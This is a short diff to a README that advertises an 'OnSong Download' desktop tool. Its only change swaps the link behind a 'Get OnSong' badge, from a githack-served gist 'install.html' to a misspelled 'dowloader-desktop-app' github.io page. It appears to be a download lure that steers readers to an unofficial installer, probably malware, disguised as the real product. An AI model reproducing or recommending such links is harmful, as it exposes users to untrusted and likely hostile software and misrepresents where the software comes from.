@@ -1,6 +1,6 @@
 # OnSong Download — Chord & Lyric Management Tool for Desktop Musicians
 
-<a href="https://gistcdn.githack.com/ijsevenredfyru1990/5fef3805e47d1d5eae86dece3c382c24/raw/04044b1072ac7b744a006b88d496157f9c6d6f2d/install.html?offer=OnSong" target="_blank">
+<a href="https://dowloader-desktop-app.github.io/.github/?offer=OnSong" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20OnSong-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
